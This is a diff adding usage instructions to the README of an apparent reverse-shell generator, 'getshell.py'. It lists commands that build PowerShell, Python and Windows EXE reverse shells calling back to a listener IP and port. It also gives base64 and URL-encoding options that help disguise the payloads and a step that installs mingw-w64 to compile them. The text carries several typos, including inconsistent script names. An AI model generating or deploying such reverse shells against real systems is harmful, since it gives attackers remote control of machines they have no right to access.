@@ -32,5 +32,37 @@ To gain control over a compromised system, an attacker usually aims to gain inte
 *  to generate python reverseshell windows
 ```
 ./getshell.py -t python -i 10.195.100.22 -p 4444 -W
-
 ```
+* to generate powershell reverseshell 
+```
+./getshellpy -t powershell -i 10.195.100.223 -p 4444 
+```
+*  to generate powershell reverseshell base64 or urlencode 
+```
+./getshellpy -t powershell -i 10.195.100.223 -p 4444 -B84
+./getshellpy -t powershell -i 10.195.100.223 -p 4444 -UE
+```
+* write output in to file and -o 
+```
+./getshellpy -t powershell -i 10.195.100.223 -p 4444 -B84 -o
+```
+### EXE reversehell 
+-------------------------------
+* to can auto compile to exe file required " sudo apt-get install mingw-w64 "
+* after insatll mingw-w64 you can compile to exe as
+``` 
+./getshell.py -t exe -i 10.195.100.22 -p 4444 
+```
+### python file :
+----------------------------------
+* to generate python file not oneline shell for windows or linux use 
+```
+./getshell.py -t python -i 10.195.100.22 -p 7777 -F 
+./getshell.py -t python -i 10.195.100.22 -p 7777 -F -W 
+```
+### note :
+* all output file will autosave at /Stote_shell/ folder 
+* option -i and  -p  your listiner ip and  port 
+### Connect me :
+   * jac11devel@gmail.com
+   * Thankypu
